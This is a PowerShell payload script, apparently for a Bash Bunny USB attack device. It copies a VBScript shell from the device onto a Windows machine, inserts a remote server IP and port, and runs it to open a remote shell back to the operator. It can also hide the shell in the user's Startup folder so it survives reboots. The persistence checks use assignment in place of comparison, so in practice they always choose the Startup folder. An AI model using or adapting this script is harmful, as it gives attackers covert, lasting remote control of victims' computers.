### Edit these variables
$remoteServerIP = "127.0.0.1" # Remote server the shell should connect to
$remoteServerPort = "1337" # Port of the remote server
$persistence = "False" # Set to "True" if you'd like your shell to persist across reboots
$volumeName = "BashBunny" # "BashBunny" is the default volume name, same value of the label set in payload.txt
### Done editing (unless you're wanting to do some custom garbage)

$driveName = (Get-WMIObject Win32_Volume | ? { $_.Label -eq $volumeName }).name
$scriptFile = $driveName + "payloads\switch1\shell.vbs"
$user = $env:UserName

## Set location of shell.vbs based on whether or not persistence is desired
if ( $persistence = "True" )
{
	$scriptDestFile = ("C:\Users\" + $user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\shell.vbs")
}
else 
{
	$scriptDestFile = "C:\temp\shell.vbs"
}

## Create file destinations if they don't exist
If ((Test-Path $scriptDestFile) -eq $false){
	New-Item -ItemType File -Path $scriptDestFile -Force
}

## Copy shell.vbs from the BB to determined locations
Copy-Item -Path $scriptFile -Destination $scriptDestFile

## Replace content in shell.vbs with values in remoteServerIP,remoteServerPort
(Get-Content -path $scriptDestFile -Raw) -replace 'REMOTE_SERVER_IP',$remoteServerIP | Set-Content -Path $scriptDestFile
(Get-Content -path $scriptDestFile -Raw) -replace 'REMOTE_SERVER_PORT',$remoteServerPort | Set-Content -Path $scriptDestFile

## Change working directory to same location as shell.vbs
if ( $persistence = "True" )
{
	Set-Location -Path ("C:\Users\" + $user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
}
else
{
	Set-Location -Path ("C:\temp")
}


Start-Process cmd -ArgumentList "/c start shell.vbs"
